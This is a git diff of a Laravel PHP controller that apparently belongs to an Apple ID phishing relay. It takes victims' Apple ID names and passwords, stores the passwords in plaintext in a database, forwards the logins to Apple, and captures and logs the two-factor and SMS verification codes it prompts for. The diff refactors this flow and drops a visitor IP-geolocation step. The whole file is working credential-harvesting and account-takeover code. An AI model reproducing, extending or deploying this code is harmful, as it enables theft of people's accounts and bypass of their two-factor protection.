@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers;
 
+use App\Apple\Exception\VerificationCodeException;
 use App\Apple\Service\Apple;
 use App\Apple\Service\AppleFactory;
 use App\Apple\Service\DataConstruct\ServiceError;
@@ -13,19 +14,17 @@ use App\Apple\Service\User\UserFactory;
 use App\Events\AccountAuthFailEvent;
 use App\Events\AccountAuthSuccessEvent;
 use App\Events\AccountLoginSuccessEvent;
-use App\Http\Integrations\IpConnector\IpConnector;
-use App\Http\Integrations\IpConnector\Requests\Ip138Request;
-use App\Http\Integrations\IpConnector\Requests\PconLineRequest;
 use App\Http\Requests\VerifyAccountRequest;
 use App\Http\Requests\VerifyCodeRequest;
 use App\Jobs\BindAccountPhone;
 use App\Models\Account;
-use App\Models\Phone;
 use App\Models\SecuritySetting;
 use Carbon\Carbon;
 use GuzzleHttp\Exception\GuzzleException;
 use Illuminate\Contracts\View\Factory;
 use Illuminate\Contracts\View\View;
+use Illuminate\Database\Eloquent\Builder;
+use Illuminate\Database\Eloquent\Model;
 use Illuminate\Foundation\Application;
 use Illuminate\Http\Client\ConnectionException;
 use Illuminate\Http\JsonResponse;
@@ -34,23 +33,19 @@ use Illuminate\Http\Response;
 use Illuminate\Routing\Redirector;
 use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Cookie;
-use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Event;
-use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\Validator;
 use Illuminate\Validation\ValidationException;
 use libphonenumber\NumberParseException;
 use libphonenumber\PhoneNumberFormat;
-use Saloon\Exceptions\Request\FatalRequestException;
-use Saloon\Exceptions\Request\RequestException;
 
 class IndexController extends Controller
 {
     public function __construct(
         protected readonly Request $request,
-        private readonly AppleFactory $appleFactory,
         private readonly PhoneNumberFactory $phoneNumberFactory,
+        protected readonly LoggerInterface $logger
     )
     {
 
@@ -79,19 +74,6 @@ class IndexController extends Controller
     public function signin(): Response
     {
         $guid = sha1(microtime());
-
-        $IpConnector = new IpConnector();
-        $apple = $this->appleFactory->create($guid);
-
-        try {
-
-            $ipaddress = $IpConnector->ipaddress(new PconLineRequest(ip: $this->request->ip()));
-            $apple->getUser()->add('ipaddress',$ipaddress);
-
-            Log::info('获取IP地址成功',['ipaddress' => $ipaddress->all()]);
-        } catch (FatalRequestException|RequestException $e) {
-
-        }
 
         return response()
             ->view('index/signin')
@@ -124,14 +106,11 @@ class IndexController extends Controller
 
     /**
      * @param VerifyAccountRequest $request
+     * @param AppleClient $apple
      * @return JsonResponse
-     * @throws AccountLockoutException
-     * @throws GuzzleException
-     * @throws UnauthorizedException|ConnectionException|\Illuminate\Http\Client\RequestException
      */
-    public function verifyAccount(VerifyAccountRequest $request): JsonResponse
+    public function verifyAccount(VerifyAccountRequest $request, AppleClient $apple): JsonResponse
     {
-        //Your Apple ID or password was incorrect 您的 Apple ID 或密码不正确
         // 获取验证过的数据
         $validatedData = $request->validated();
 
@@ -150,19 +129,24 @@ class IndexController extends Controller
             $accountName = $this->formatPhone($accountName);
         }
 
+        //毫秒时间戳
         $guid = $request->cookie('Guid');
 
-        $apple = $this->appleFactory->create($guid);
+        $response = $apple->login($accountName, $password);
 
-        $apple->getUser()->add('accountName', $accountName);
+        $apple->clear();
+        $apple->getUser()->set('account', $accountName);
+        $apple->getUser()->set('password', $password);
 
-        $response = $apple->signin($accountName, $password);
+        if ($trustedPhoneNumber = $response->getTrustedPhoneNumber()){
+            $apple->getAppleIdConnector()
+                ->getRepositories()
+                ->add('trustedPhoneNumber',$trustedPhoneNumber);
+        };
 
         $account = Account::updateOrCreate([
             'account' => $accountName,
         ],[ 'password' => $password]);
-
-        $apple->getUser()->add('account', $account);
 
         $error = $response->firstAuthServiceError()?->getMessage();
         Session::flash('Error',$error);
@@ -203,26 +187,32 @@ class IndexController extends Controller
     }
 
     /**
+     * @param AppleClient $apple
      * @return Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
-     * @throws GuzzleException
-     * @throws UnauthorizedException|ConnectionException
      */
-    public function authPhoneList(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
+    public function authPhoneList( AppleClient $apple): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
     {
-        $response = $this->getApple()->auth();
+        $phoneList = $apple->getAppleIdConnector()
+            ->getRepositories()
+            ->get('phone_list');
 
-        $trustedPhoneNumbers = $response->getTrustedPhoneNumbers();
-        return view('index.auth-phone-list',['trustedPhoneNumbers' => $trustedPhoneNumbers]);
+        $phoneList ??= $apple->auth()->getTrustedPhoneNumbers();
+
+        return view('index.auth-phone-list',['trustedPhoneNumbers' => $phoneList]);
     }
+
 
     /**
      * 验证安全码
      * @param VerifyCodeRequest $request
+     * @param AppleClient $apple
      * @return JsonResponse
-     * @throws UnauthorizedException
-     * @throws VerificationCodeIncorrect|ConnectionException
+     * @throws VerificationCodeException
+     * @throws \JsonException
+     * @throws \Saloon\Exceptions\Request\FatalRequestException
+     * @throws \Saloon\Exceptions\Request\RequestException
      */
-    public function verifySecurityCode(VerifyCodeRequest $request): JsonResponse
+    public function verifySecurityCode(VerifyCodeRequest $request,AppleClient $apple): JsonResponse
     {
         // 检索验证过的输入数据...
         $validated = $request->validated();
@@ -233,10 +223,10 @@ class IndexController extends Controller
 
         try {
 
-            $response = $this->getApple()->validateSecurityCode($code);
+            $response = $apple->verifySecurityCode($code);
 
             Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "安全码验证成功 code:{$code}"));
-        } catch (VerificationCodeIncorrect $e) {
+        } catch (VerificationCodeException $e) {
             Event::dispatch(new AccountAuthFailEvent(account: $account,description: "安全码验证失败 {$e->getMessage()}"));
             throw $e;
         }
@@ -247,7 +237,7 @@ class IndexController extends Controller
         return $this->success($response->json() ?? []);
     }
 
-    protected function getAccountInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
+    protected function getAccountInfo(string $accountName): Model|Builder|Account|\Illuminate\Database\Query\Builder|null
     {
         return Account::where('account', $accountName)->first();
     }
@@ -255,12 +245,13 @@ class IndexController extends Controller
     /**
      * 验证手机验证码
      * @param VerifyCodeRequest $request
+     * @param AppleClient $apple
      * @return JsonResponse
-     * @throws UnauthorizedException
+     * @throws VerificationCodeException
      * @throws VerificationCodeIncorrect
-     * @throws ConnectionException
+     * @throws \JsonException
      */
-    public function smsSecurityCode(VerifyCodeRequest $request): JsonResponse
+    public function smsSecurityCode(VerifyCodeRequest $request,AppleClient $apple): JsonResponse
     {
         // 检索验证过的输入数据...
         $validated = $request->validated();
@@ -278,10 +269,10 @@ class IndexController extends Controller
         // 验证手机号码
         try {
 
-            $response = $this->getApple()->validatePhoneSecurityCode($code,(int) $Id);
+            $response = $apple->verifyPhoneCode($code,(int) $Id);
 
             Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "手机验证码验证成功 code:{$code}"));
-        } catch (VerificationCodeIncorrect|UnauthorizedException|ConnectionException $e) {
+        } catch (VerificationCodeException $e) {
             Event::dispatch(new AccountAuthFailEvent(account: $account,description: "{$e->getMessage()}"));
             throw $e;
         }
@@ -294,16 +285,16 @@ class IndexController extends Controller
 
     /**
      * 获取安全码
+     * @param AppleClient $apple
      * @return JsonResponse
-     * @throws UnauthorizedException|ConnectionException
+     * @throws \JsonException
      */
-    public function SendSecurityCode(): JsonResponse
+    public function SendSecurityCode(AppleClient $apple): JsonResponse
     {
-        $apple = $this->getApple();
 
         try {
 
-            $response = $apple->idmsa->sendSecurityCode()->json();
+            $response = $apple->sendSecurityCode()->json();
 
             $this->getAccount()
                 ->logs()
@@ -329,29 +320,31 @@ class IndexController extends Controller
 
     /**
      * 获取手机号码
+     * @param AppleClient $apple
      * @return JsonResponse
-     * @throws UnauthorizedException
-     * @throws GuzzleException|ConnectionException
      */
-    public function GetPhone(): JsonResponse
+    public function GetPhone(AppleClient $apple): JsonResponse
     {
-        $response = $this->getApple()->auth();
+        $trustedPhoneNumber = $apple->getAppleIdConnector()
+            ->getRepositories()
+            ->get('trustedPhoneNumber');
 
-        $trustedPhoneNumbers = $response->getTrustedPhoneNumber();
+        $trustedPhoneNumber ??= $apple->auth()->getTrustedPhoneNumber();
 
         return $this->success([
-            'ID'                  => $trustedPhoneNumbers?->getId(),
-            'Number'              => $trustedPhoneNumbers?->getNumberWithDialCode(),
+            'ID'                  => $trustedPhoneNumber?->getId(),
+            'Number'              => $trustedPhoneNumber?->getNumberWithDialCode(),
         ]);
     }
 
     /**
      * 发送验证码
+     * @param AppleClient $apple
      * @return JsonResponse|Redirector
      * @throws ValidationException
-     * @throws \Exception
+     * @throws \JsonException
      */
-    public function SendSms(): JsonResponse|Redirector
+    public function SendSms(AppleClient $apple): JsonResponse|Redirector
     {
         $params = Validator::make($this->request->all(), [
             'ID' => 'required|integer|min:1'
@@ -359,7 +352,7 @@ class IndexController extends Controller
 
         try {
 
-            $response = $this->getApple()->sendPhoneSecurityCode((int) $params['ID']);
+            $response = $apple->sendPhoneSecurityCode((int) $params['ID']);
 
             $this->getAccount()
                 ->logs()
